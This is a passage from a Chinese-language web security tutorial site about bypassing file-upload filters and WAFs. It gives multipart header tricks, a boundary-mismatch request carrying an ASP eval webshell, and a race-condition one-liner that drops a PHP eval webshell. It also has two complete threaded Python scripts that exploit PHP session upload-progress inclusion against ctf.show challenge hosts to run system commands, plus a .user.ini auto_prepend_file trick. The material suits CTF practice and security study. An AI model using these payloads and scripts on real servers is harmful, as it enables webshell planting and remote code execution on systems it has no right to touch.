+<div class="highlight"><pre><span></span><code><span class="x">COntEnT-DIsposiTiOn: form-data; name=&quot;file&quot;; filename=&quot;a.php&quot;</span>
+<span class="x">大小写混淆</span>
+
+<span class="x">Content-Type: image/gif</span>
+<span class="x">Content-Disposition: form-data; name=&quot;file&quot;;  filename=&quot;a.php&quot;</span>
+<span class="x">调换Content-Type和ConTent-Disposition的顺序</span>
+
+<span class="x">Content-Type: image/gif</span>
+<span class="x">Content-Disposition: form-data; name=&quot;file&quot;;  filename=&quot;a.php&quot;</span>
+<span class="x">Content-Type: image/gif</span>
+<span class="x">增加额外的头</span>
+
+<span class="x">AAAAAAAA:filename=&quot;aaa.jpg&quot;;</span>
+<span class="x">Content-Disposition: form-data; name=&quot;file&quot;;  filename=&quot;a.php&quot;</span>
+<span class="x">Content-Type: image/gif</span>
+<span class="x">增加额外的头</span>
+
+<span class="x">Content-Length: 666</span>
+<span class="x">Content-Disposition: form-data; name=&quot;file&quot;;  filename=&quot;a.php&quot;</span>
+<span class="x">Content-Type: image/gif</span>
+<span class="x">增加额外的头</span>
+</code></pre></div>
+<h3 id="_11">双文件绕过<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<p>安全狗总以最后一个Content-Disposition中的值做为接收参数进行检测，一些中间件例如IIS6.0总是以第一个Content-Disposition中的值做为接收参数。</p>
+<h3 id="wafboundary">容器与WAF对Boundary要求规则不一致<a class="headerlink" href="#wafboundary" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="x">Content-Type: multipart/form-data; boundary=---------------------------471****1141173****525****99</span>
+<span class="x">Content-Length: 253</span>
+<span class="x">-----------------------------471****1141173****525****99</span>
+<span class="x">Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;shell.asp&quot;</span>
+<span class="x">Content-Type: application/octet-stream</span>
+<span class="x">&lt;%eval request(&quot;a&quot;)%&gt;</span>
+<span class="x">-----------------------------471****1141173****525****99--</span>
+</code></pre></div>
+<p>一些WAF会认为两段Boundary不一致的数据是无意义的，不进行检测，而容器并没有严格要求，正常接收数据。</p>
+<h3 id="_12">条件竞争<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<p>一些情况下在上传文件时，先上传到临时目录，然后再检测，检测到再删除</p>
+<p>可以上传生成一句话木马的文件：</p>
+<div class="highlight"><pre><span></span><code><span class="x">fputs(fopen(&#39;shell6666.php&#39;,&#39;w&#39;),&#39;</span><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="cp">?&gt;</span><span class="x">&#39;);</span>
+</code></pre></div>
+<p>上传同时疯狂重复发包访问此文件，就有可能会在文件被删除之前生成webshell文件<code>shell6666.php</code></p>
+<h3 id="session">Session竞争<a class="headerlink" href="#session" title="Permanent link">&para;</a></h3>
+<p><strong>session文件包含</strong>，先了解一些知识点，在php5.4之后php.ini开始有几个默认选项</p>
+<blockquote>
+<p>1.session.upload_progress.enabled = on
+2.session.upload_progress.cleanup = on
+3.session.upload_progress.prefix = “upload_progress_”
+4.session.upload_progress.name = “PHP_SESSION_UPLOAD_PROGRESS”
+5.session.use_strict_mode=off</p>
+<p>第一个表示当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中
+第二个表示当文件上传结束后，php将会立即清空对应session文件中的内容
+第三和第四个<code>prefix+name</code>将表示为session中的键名
+第五个表示我们对Cookie中sessionID可控</p>
+</blockquote>
+<p>我们可以利用<code>session.upload_progress</code>将木马写入session文件，然后包含这个session文件。不过前提是我们需要创建一个session文件，并且知道session文件的存放位置。因为<code>session.use_strict_mode=off</code>的关系，我们可以自定义sessionID</p>
+<p>linux系统中session文件一般的默认存储位置为 /tmp 或 /var/lib/php/session</p>
+<p>例如我们在Cookie中设置了PHPSESSID=flag，php会在服务器上创建文件：/tmp/sess_flag，即使此时用户没有初始化session，php也会自动初始化Session。 并产生一个键值，为<code>prefix+name</code>的值，最后被写入sess_文件里
+还有一个关键点就是<code>session.upload_progress.cleanup</code>默认是开启的，只要读取了post数据，就会清除进度信息，所以我们需要利用条件竞争来pass，写一个脚本来完成</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">io</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://453228ae-28f2-4bb0-b401-83514feae8df.chall.ctf.show:8080/&#39;</span>
+
+<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;?php system(&quot;tac f*&quot;);?&gt;dotast&#39;</span>
+    <span class="p">}</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">f</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">10</span><span class="p">)</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="s1">&#39;flag&#39;</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;dota.txt&#39;</span><span class="p">,</span> <span class="n">f</span><span class="p">)})</span>
+<span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s1">&#39;?file=/tmp/sess_flag&#39;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="s1">&#39;dotast&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+            <span class="k">break</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;retry&#39;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+    <span class="n">write</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">write</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,))</span>
+    <span class="n">write</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="kc">True</span>
+    <span class="n">write</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+    <span class="n">read</span><span class="p">(</span><span class="n">session</span><span class="p">)</span>
+</code></pre></div>
+<p>然后我们说到**session文件上传**，还是一样先上传<code>.user.ini</code> ，内容为</p>
+<div class="highlight"><pre><span></span><code><span class="na">GIF89a</span><span class="w"></span>
+<span class="na">auto_prepend_file</span><span class="o">=</span><span class="s">/tmp/sess_muma</span><span class="w"></span>
+</code></pre></div>
+<p>接着再运行脚本即可</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">io</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://3238a505-5728-4702-b83b-98460ec17f8d.chall.ctf.show:8080/&#39;</span>
+
+<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#39;</span>
+    <span class="p">}</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">f</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;GIF89a</span><span class="se">\n</span><span class="s1">dotast&#39;</span><span class="p">)</span>
+        <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;1.png&#39;</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="s1">&#39;image/png&#39;</span><span class="p">)}</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s2">&quot;upload.php&quot;</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="s1">&#39;muma&#39;</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s1">&#39;upload&#39;</span><span class="p">)</span>
+        <span class="c1"># payload_url = target_url + &#39;?file=&#39; + &#39;/tmp/sess_&#39; + session_id 由于传了.user.ini了，不需要指定所需包含的文件了</span>
+        <span class="k">if</span> <span class="s1">&#39;ctfshow&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+            <span class="k">break</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;retry&#39;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">):</span>
+        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">write</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">):</span>
+        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">read</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</code></pre></div>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="页脚" >
+      
+        
+        <a href="../../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Python反序列化" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                上一页
+              </span>
+              Python反序列化
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../../../%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/" class="md-footer__link md-footer__link--next" aria-label="下一页: PWN入门" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                下一页
+              </span>
+              PWN入门
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2019 - 2022 F1rstb100d
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.instant", "navigation.sections", "navigation.tabs"], "search": "../../../assets/javascripts/workers/search.16e2a7d4.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\s\\-\uff0c\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.d6c3db9e.min.js"></script>
+      
+    
+  </body>
+</html>
